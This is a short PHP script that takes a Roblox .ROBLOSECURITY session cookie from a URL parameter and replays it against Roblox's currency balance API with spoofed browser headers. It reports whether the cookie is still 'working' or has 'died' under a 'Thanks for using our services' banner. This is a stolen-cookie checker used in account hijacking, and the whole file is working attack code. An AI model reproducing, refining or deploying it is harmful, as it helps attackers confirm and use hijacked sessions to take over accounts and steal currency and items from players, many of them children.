<?php
$cookie1 = $_GET["cookie"];
$cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_$cookie1";
    $check= curl_init();

curl_setopt($check, CURLOPT_URL, 'https://api.roblox.com/currency/balance');
curl_setopt($check, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($check, CURLOPT_HTTPHEADER, $headers);
$output2 = curl_exec($check);
$httpcode = curl_getinfo($check, CURLINFO_HTTP_CODE); 
if ($httpcode == '200'){
    $cookiecorrect = 'Cookie Working';
        echo "Thanks for using our services!";
    echo "<br>";
    echo "</br>";
    echo $cookiecorrect;


}
else{
    $cookieincorrect = 'Cookie Die';
    echo "Thanks for using our services!";
    echo "<br>";
    echo "</br>";
    echo $cookieincorrect;
}
?>